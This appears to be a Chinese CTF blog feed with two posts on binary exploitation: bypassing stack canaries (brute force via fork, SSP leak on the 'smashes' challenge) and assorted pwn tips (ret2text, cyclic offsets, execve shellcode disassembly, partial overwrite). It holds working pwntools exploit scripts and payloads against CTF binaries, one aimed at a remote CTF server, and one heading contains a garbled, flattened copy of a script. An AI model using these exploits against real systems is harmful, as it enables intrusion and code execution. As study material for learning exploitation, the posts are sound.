      <title>PWN技巧-绕过Canary的几种姿势</title>
      <link href="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/"/>
      <url>/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="1-格式化字符串漏洞获取Canary"><a href="#1-格式化字符串漏洞获取Canary" class="headerlink" title="1. 格式化字符串漏洞获取Canary"></a>1. 格式化字符串漏洞获取Canary</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x49</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;overflow?\n&#x27;</span>,pl1)</span><br><span class="line">data=p.recv()</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span>+data[<span class="number">0x49</span>:<span class="number">0x49</span>+<span class="number">7</span>]</span><br><span class="line">canary = <span class="built_in">int</span>.from_bytes(canary,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;canary:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure><h2 id="2-覆盖截断字符获取Canary"><a href="#2-覆盖截断字符获取Canary" class="headerlink" title="2. 覆盖截断字符获取Canary"></a>2. 覆盖截断字符获取Canary</h2><h2 id="3-逐字节爆破Canary"><a href="#3-逐字节爆破Canary" class="headerlink" title="3. 逐字节爆破Canary"></a>3. 逐字节爆破Canary</h2><blockquote><p>适用于有通过fork()函数创建的子进程的程序</p><h3 id="爆破原理"><a href="#爆破原理" class="headerlink" title="爆破原理"></a>爆破原理</h3><ul><li>对于Canary，虽然每次进程重启后Canary不同，<strong>但是同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存</strong>。</li><li>最低位为0x00，之后逐次爆破，如果canary爆破不成功，则程序崩溃；爆破成功则程序进行下面的逻辑。由此可判断爆破是否成功。</li><li>我们可以利用这样的特点，彻底逐个字节将Canary爆破出来。<h3 id="通用模板"><a href="#通用模板" class="headerlink" title="通用模板"></a>通用模板</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  info(<span class="string">f&#x27;-----No:<span class="subst">&#123;k+<span class="number">1</span>&#125;</span> start,finding-----&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0xc</span>)+canary+<span class="built_in">bytes</span>([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="built_in">print</span>(recv)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;stack&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">      canary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><a href="https://xzfile.aliyuncs.com/upload/affix/20190402135117-554ed694-550b-1.zip">https://xzfile.aliyuncs.com/upload/affix/20190402135117-554ed694-550b-1.zip</a></li></ul></blockquote><p>起手一套经典连招<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214201715.png" alt="Pasted image 20250214201715"><br>32位程序，开启了Canary和NX保护，随后IDA查看<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214202433.png" alt="Pasted image 20250214202433"><br>程序中含有fork函数，是可进行爆破canary的重点<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214202509.png" alt="Pasted image 20250214202509"><br>fun函数read有栈溢出，buf空间有100=0x64，而我们可以输入0x78的内容，很明显栈溢出<br>这个v2就是Canary<br>我们的思路就是一位一位爆破Canary</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb bin1</span><br><span class="line">b *<span class="number">0x0804874B</span></span><br><span class="line">b *<span class="number">0x0804870C</span></span><br><span class="line">r</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="comment">//跟随子进程</span></span><br><span class="line">c</span><br><span class="line">telescope $esp <span class="number">35</span></span><br><span class="line">canary</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  info(<span class="string">f&#x27;-----No:<span class="subst">&#123;k+<span class="number">1</span>&#125;</span> start,finding-----&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0xc</span>)+canary+<span class="built_in">bytes</span>([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="built_in">print</span>(recv)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;stack&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">      canary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x0804863B</span> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">100</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">12</span> + p32(addr) </span><br><span class="line">p.send(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>getshell<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214225926.png" alt="Pasted image 20250214225926"></p><h2 id="4-SSP泄露Canary"><a href="#4-SSP泄露Canary" class="headerlink" title="4. SSP泄露Canary"></a>4. SSP泄露Canary</h2><blockquote><p>适用于Flag存储于内存空间中的情况</p></blockquote><h3 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h3><blockquote><p>OJ的smashes</p></blockquote><p>Stack smash就是绕过canary保护的技术。在程序加载了canary保护之后，如果我们是在覆盖缓冲区的时候就会连带着覆盖了canary保护的cookie，<strong>这个时候程序就会报错。但是这个技术并不在乎是否报错，而是在乎报错的内容</strong>。stack smash技巧就是利用打印这一信息的程序来得到我们想要的内容。<br>这是因为在程序启动canary保护之后，如果发现canary被修改的话就会执<strong>stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下这个指针指向程序名。代码如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>所以如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串地址，那么在</strong>fortify_fail函数中就会输出我们想要的信息<br><strong>ssp攻击：argv[0]是指向第一个启动参数字符串的指针，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值</strong></p><h3 id="xxxxxxxxxx21-1from-pwn-import-2-context-log-level-“debug”3context-terminal-“deepin-terminal”-“-x”-“sh”-“-c”-4​5while-True-6-try-7-io-process-“-babypie”-timeout-1-8-9-gdb-attach-io-10-io-sendafter-b”-n”-b’a’-0x30-0x8-1-11-io-recvuntil-b’a’-0x30-0x8-1-12-canary-b’-0’-io-recvn-7-13-success-canary-encode-‘hex’-14-15-gdb-attach-io-16-io-sendafter-b”-n”-b’a’-0x30-0x8-canary-b’bbbbbbbb’-b’-x3E-x0A’-17-18-io-interactive-19-except-Exception-as-e-20-io-close-21-print-（e）python"><a href="#xxxxxxxxxx21-1from-pwn-import-2-context-log-level-“debug”3context-terminal-“deepin-terminal”-“-x”-“sh”-“-c”-4​5while-True-6-try-7-io-process-“-babypie”-timeout-1-8-9-gdb-attach-io-10-io-sendafter-b”-n”-b’a’-0x30-0x8-1-11-io-recvuntil-b’a’-0x30-0x8-1-12-canary-b’-0’-io-recvn-7-13-success-canary-encode-‘hex’-14-15-gdb-attach-io-16-io-sendafter-b”-n”-b’a’-0x30-0x8-canary-b’bbbbbbbb’-b’-x3E-x0A’-17-18-io-interactive-19-except-Exception-as-e-20-io-close-21-print-（e）python" class="headerlink" title="xxxxxxxxxx21 1from pwn import 2#  context.log_level = “debug”3context.terminal = [“deepin-terminal”, “-x”, “sh”, “-c”]4​5while True:6    try:7        io = process(“./babypie”, timeout = 1)8        9        #  gdb.attach(io)10        io.sendafter(b”:\n”, b’a’  (0x30 - 0x8 + 1))11        io.recvuntil(b’a’  (0x30 - 0x8 + 1))12        canary = b’\0’ + io.recvn(7)13        success(canary.encode(‘hex’))14        15        #  gdb.attach(io)16        io.sendafter(b”:\n”, b’a’  (0x30 - 0x8) + canary + b’bbbbbbbb’ + b’\x3E\x0A’)17        18        io.interactive()19    except Exception as e:20        io.close()21        print （e）python"></a>xxxxxxxxxx21 1from pwn import <em>2#  context.log_level = “debug”3context.terminal = [“deepin-terminal”, “-x”, “sh”, “-c”]4​5while True:6    try:7        io = process(“./babypie”, timeout = 1)8        9        #  gdb.attach(io)10        io.sendafter(b”:\n”, b’a’ </em> (0x30 - 0x8 + 1))11        io.recvuntil(b’a’ <em> (0x30 - 0x8 + 1))12        canary = b’\0’ + io.recvn(7)13        success(canary.encode(‘hex’))14        15        #  gdb.attach(io)16        io.sendafter(b”:\n”, b’a’ </em> (0x30 - 0x8) + canary + b’bbbbbbbb’ + b’\x3E\x0A’)17        18        io.interactive()19    except Exception as e:20        io.close()21        print （e）python</h3><p>老连招<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215192414.png" alt="Pasted image 20250215192414"><br>开了Canary和NX<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215193505.png" alt="Pasted image 20250215193505"><br>程序提供两次输入<code>!_IO_gets(v3)</code>和<code>**_IO_getc(stdin)**</code>两次输入都存在栈溢出漏洞<br>顺带提一下第二次的输入：将内容输入到stdio中，通过循环最后赋值给了byte_600D20,可以看到数组里面存放的是一条flag，此外程序中还提到了overwrite flag，所以这道题并不是拿shell，而是一道拿flag的题。回到前面的程序，v1变量接收第二次输入的字符串，并且会不断覆盖原有的flag内容<br>再看以下memset函数：<br><code>memset((void *)((int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));</code><br>这个函数的意思是从v1 + 0x600D20LL这个地址往后32 - v1字节的内容都以0替代。<br>函数原型`void <em> memset( void </em> ptr, int value, size_t num );<br>可以看到0x600D20处正是我们flag所在的位置，所以无论进不进行第二次输入，程序都会把原有的flag覆盖掉。这就很麻烦了，我们想要的就是利用canary打印报错的原理，将argv[0]指向这个flag的地址，但是flag无论怎么样都会被覆盖</p><p>这个时候就需要利用一个技巧：<strong><em>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出</em></strong></p><blockquote><p><strong>当可执行文件足够小时，它的不同区段可能会被多次映射</strong></p><h4 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h4><p>我们可以将程序用gdb打开，运行起来看一下程序映射的情况：<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215193505-1742920939134-10.png" alt="Pasted image 20250215193505"></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x400000</span>           <span class="number">0x401000</span> r-xp     <span class="number">1000</span>      <span class="number">0</span> /home/zechariah/桌面/pwn_learn/start/smashes</span><br><span class="line"><span class="number">0x600000</span>           <span class="number">0x601000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> /home/zechariah/桌面/pwn_learn/start/smashes</span><br></pre></td></tr></table></figure><p>在调试的时候可以看到smashes被映射到两处地址中，所以只要在二进制文件<code>(offset)0x0000 ~ 0x1000</code>范围内的内容都会被映射到内存中，分别以<code>0x400000</code>和<code>0x600000</code>作为起始地址。flag在<code>0x00000d20</code>，所以会在内存中出现两次，分别位于<code>0x00600d20</code>和<code>0x00400d20</code>。所以虽然<code>0x00600d20</code>的位置虽然被覆盖了，但是依然可以在<code>0x00400d20</code>的位置找到flag<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215213101.png" alt="Pasted image 20250215213101"></p><h4 id="找argv-0-指针位置"><a href="#找argv-0-指针位置" class="headerlink" title="找argv[0]指针位置"></a>找argv[0]指针位置</h4><p>知道了flag存放的位置，接下来需要找argv[0]所在的位置了，argv[0]有一个明显的特征，就是他会指向程序名，所以我们可以使用gdb在main函数处下断点，接下来找指向程序名的指针就会是argv[0]了<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215213646.png" alt="Pasted image 20250215213646"><br>0x7fffffffdf2f存放程序名称，这个地址被放在0x7fffffffdbf8处，只要把0x7fffffffdbf8中的内容替换成flag即可<br>也可以用命令<code>p &amp; __libc_argv[0]</code> 得到argv[0]的地址<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215213950.png" alt="Pasted image 20250215213950"></p><h4 id="寻找输入时的栈顶位置"><a href="#寻找输入时的栈顶位置" class="headerlink" title="寻找输入时的栈顶位置"></a>寻找输入时的栈顶位置</h4><p>先看一下gets函数调用的位置。<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215214432.png" alt="Pasted image 20250215214432">因为在64位程序中rdi寄存器中存放的是当前执行函数的一参，所以当前的栈顶就是gets函数的一参。所以当前栈顶的位置到刚才的argv[0]的偏移距离就是我们的溢出长度，所以我们通过计算<br><code>0x7fffffffdbf8 - 0x7fffffffd9a0 = 0x218</code><br>也就是说我们输入内容要在0x218以后才能把argv[0]给覆盖掉，并且输入0x218个内容之后把0x00400d20写上就可以了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=process(&#x27;./smashes&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>,<span class="number">9877</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x218</span>+p64(<span class="number">0x400d20</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name? &#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;flag: &#x27;</span>,<span class="string">&#x27;hollk&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (p.recvall())</span><br></pre></td></tr></table></figure><p><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215214432-1742920972819-16.png" alt="Pasted image 20250215214432"><br>Ubuntu版本原因(libc 2.27之后加了其他机制)，远程可打通，本地不行</p><h2 id="5-劫持-stack-chk-fail函数"><a href="#5-劫持-stack-chk-fail函数" class="headerlink" title="5. 劫持__stack_chk_fail函数"></a>5. 劫持__stack_chk_fail函数</h2>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
            <tag> PWN技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN技巧-其他</title>
      <link href="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/"/>
      <url>/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/</url>
      
        <content type="html"><![CDATA[<h1 id="换库"><a href="#换库" class="headerlink" title="换库"></a>换库</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings libc.so.6 | grep <span class="string">&#x27;ubuntu&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Ubuntu GLIBC 2.35-0ubuntu3.8</span></span><br><span class="line"><span class="comment">#Ubuntu GLIBC 2.23-0ubuntu11.3</span></span><br><span class="line">./download 2.23-0ubuntu11.3_amd64</span><br><span class="line">patchelf --set-interpreter /home/zechariah/glibc-all-in-one/libs/2.35-0ubuntu3.9_amd64/ld-linux-x86-64.so.2 filename</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 filename    </span><br></pre></td></tr></table></figure><h1 id="Capstone字节码转汇编代码"><a href="#Capstone字节码转汇编代码" class="headerlink" title="Capstone字节码转汇编代码"></a><strong>Capstone字节码转汇编代码</strong></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(shellcode_x86, <span class="number">0x00</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_32): 初始化类，给两个参数（硬件架构和硬件模式）</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(shellcode, <span class="number">0x00</span>):  disasm 反汇编这段HEX, 它的参数是shellcode和起始地址。</span><br><span class="line"><span class="built_in">print</span>(“0x%x:\t%s\t%s” %(i.address, i.mnemonic, i.op_str)):打印地址和操作数。</span><br></pre></td></tr></table></figure><h1 id="测量变量溢出长度-cyclic"><a href="#测量变量溢出长度-cyclic" class="headerlink" title="测量变量溢出长度(cyclic)"></a><strong>测量变量溢出长度(cyclic)</strong></h1><h2 id="初试"><a href="#初试" class="headerlink" title="初试"></a>初试</h2><p>checksec，32位<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123732.png" alt="Pasted image 20250122123732"><br>拖入IDA<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123854.png" alt="Pasted image 20250122123854"><br>容易引起栈溢出的函数<code>gets</code><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123840.png" alt="Pasted image 20250122123840"><br>找到后门函数<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122124119.png" alt="Pasted image 20250122124119"><br>地址为<code>0x804863A</code><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123911.png" alt="Pasted image 20250122123911"><br>完成如下exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">offset=<span class="number">104</span></span><br><span class="line">addr = <span class="number">0x804863A</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* offset + p32(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122124958.png" alt="Pasted image 20250122124958"><br>打不通</p><h2 id="手动测量变量溢出长度"><a href="#手动测量变量溢出长度" class="headerlink" title="手动测量变量溢出长度"></a>手动测量变量溢出长度</h2><p>猜测也许是IDA中的变量溢出长度是错误的<br>于是我们手动测量</p><h3 id="工具cyclic生成字符串"><a href="#工具cyclic生成字符串" class="headerlink" title="工具cyclic生成字符串"></a>工具cyclic生成字符串</h3><p><code>cyclic 200</code>生成一个长度为200的字符串<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122130556.png" alt="Pasted image 20250122130556"></p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122130859.png" alt="Pasted image 20250122130859"><br>据此可知最先溢出的部分是<code>0x62616164</code></p><h3 id="查找填充空栈所需量"><a href="#查找填充空栈所需量" class="headerlink" title="查找填充空栈所需量"></a>查找填充空栈所需量</h3><p><code>cyclic -l 0x62616164</code><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122131009.png" alt="Pasted image 20250122131009"><br>实际上的offset是<code>112</code><br>修改exp如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">addr = <span class="number">0x804863A</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* offset + p32(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122125055.png" alt="Pasted image 20250122125055"><br>成功getshell！！！！！</p><h1 id="绕过PIE保护-Partial-overwrite"><a href="#绕过PIE保护-Partial-overwrite" class="headerlink" title="(绕过PIE保护)Partial overwrite"></a><strong>(绕过PIE保护)Partial overwrite</strong></h1><h2 id="栈上的partial-overwrite"><a href="#栈上的partial-overwrite" class="headerlink" title="栈上的partial overwrite"></a>栈上的partial overwrite</h2><p>我们知道，在程序开启了PIE保护时(PIEenabled)高位的地址会发生随机化，<strong>但低位的偏移是始终固定的，也就是说如果我们能更改低位的偏移，就可以在一定程度上控制程序的执行流，绕过PIE保护</strong>。</p><blockquote><p>partial overwrite不仅仅可以用在栈上，同样可以用在其它随机化的场景。比如堆的随机化，由于堆起始地址低字节一定是0x00，也可以通过覆盖低位来控制堆上的偏移。</p></blockquote><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><blockquote><p>无法拿到附件，本例未经过本人复现，仅摘录</p></blockquote><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212716-1742921186249-29.png" alt="Pasted image 20250217212716"><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212727.png" alt="Pasted image 20250217212727"><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212740.png" 